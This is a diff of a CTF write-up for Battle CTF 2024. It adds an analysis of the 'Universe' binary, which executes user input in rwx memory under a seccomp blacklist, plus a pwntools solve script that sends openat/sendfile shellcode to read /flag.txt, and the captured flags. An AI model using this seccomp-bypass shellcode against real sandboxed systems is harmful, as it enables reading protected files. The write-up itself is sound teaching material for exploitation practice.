@@ -1,4 +1,4 @@
-<h3> Battle CTF 2024 </h3>
+![image](https://github.com/user-attachments/assets/0d2ba4f3-7bb1-49ed-a9e9-40bfec915f3d)<h3> Battle CTF 2024 </h3>
 
 ![image](https://github.com/user-attachments/assets/9d74fbd3-a76b-421c-8247-8630551c826d)
 
@@ -485,7 +485,7 @@ In my case i went with:
 - openat
 - sendfile
 
-This is my final exploit
+This is my final [exploit](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Sweet%20Game/solve.py)
 
 ```python
 #!/usr/bin/env python3
@@ -569,7 +569,171 @@ During the time I solved it i didn't overwrite the seed variable because it uses
 Flag: battleCTF{TimeRand_hijack2Secc0mpF1!t3rBypass_3965657b94b0a5129710dc275f6d98e427be1aa1b83b448445e0329cf3f7e4e1}
 ```
 
+**Universe**
+
+We are given an executable, and checking the file type and protections enabled on it shows this
+![image](https://github.com/user-attachments/assets/7c05a5f9-8bb0-4eb5-af40-32ee51b332c5)
+
+So this is a 64 bits binary which is dynamically linked and stripped
+
+From the result of `checksec` we can see:
+- NX is enabled
+- PIE is enabled
+
+As usual i ran it to get an overview of what it does
+![image](https://github.com/user-attachments/assets/1a475bc6-db54-4ba0-b8d0-bab4e108630c)
+
+Seems to do nothing other than receive our input?
+
+In any case i'll decompile it to figure that out
+
+Here's the main function
+![image](https://github.com/user-attachments/assets/6413f73b-e6fc-41d0-8475-1fba5665de41)
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  FILE *v3; // rdi
+  void (__fastcall *v5)(FILE *); // [rsp+10h] [rbp-10h]
+  int v6; // [rsp+1Ch] [rbp-4h]
+
+  v6 = 0;
+  v5 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
+  puts("Africa battleCTF 2024");
+  puts(
+    "By its very subject, cosmology flirts with metaphysics. Because how can we study an object from which we cannot extr"
+    "act ourselves? Einstein had this audacity and the Universe once again became an object of science. Without losing it"
+    "s philosophical dimension.\n"
+    "What do you think of the universe?");
+  v3 = stdout;
+  fflush(stdout);
+  sub_1208(v3);
+  while ( v6 != 4096 )
+  {
+    v3 = 0LL;
+    v6 += read(0, v5 + v6, 4096 - v6);
+  }
+  v5(v3);
+  return 0LL;
+}
+```
+
+Basically it creates a memory region with `rwx` permission then it calls function `sub_1208` and while the length of that memory isn't up to `4096` bytes it would keep on reading in the data from stdin and after that it executes the value stored into that memory region
+
+Here's the decompilation for `sub_1208`
+![image](https://github.com/user-attachments/assets/55bfb5f5-e163-427f-bed0-d04156667947)
+
+```c
+__int64 sub_1208()
+{
+  qword_4078 = seccomp_init(2147418112LL);
+  if ( !qword_4078 )
+  {
+    seccomp_reset(0LL, 2147418112LL);
+    _exit(-1);
+  }
+  seccomp_arch_add(qword_4078, 3221225534LL);
+  sub_11C9(2LL);
+  sub_11C9(56LL);
+  sub_11C9(57LL);
+  sub_11C9(58LL);
+  sub_11C9(59LL);
+  sub_11C9(85LL);
+  sub_11C9(322LL);
+  return seccomp_load(qword_4078);
+}
+```
+
+It does some seccomp initialization, this time around i made use of `seccomp-dump` to know the rules applied
+![image](https://github.com/user-attachments/assets/119c2908-edfe-468a-841a-784a4f775bd2)
+
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
+ 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
+ 0006: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0013
+ 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013
+ 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013
+ 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
+ 0010: 0x15 0x02 0x00 0x00000055  if (A == creat) goto 0013
+ 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
+ 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0013: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+We see that it would allow any syscall aside the ones blacklisted
+
+I solve this one using yet orw shellcode
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Universe/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('universe')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x136E
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
 
 
+def solve():
 
 
+    shellcode = asm(shellcraft.linux.openat(-1, "/flag.txt"))
+    shellcode += asm(shellcraft.linux.sendfile(1, 'rax', 0, 500))
+    shellcode = shellcode.ljust(4096, asm("nop"))
+
+    io.sendline(shellcode)
+
+    io.interactive()
+
+
+def main():
+    
+    init()
+    solve()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it works!
+![image](https://github.com/user-attachments/assets/9b850220-73c0-4eef-a262-d463414c2cfc)
+
+```
+Flag: battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}
+```
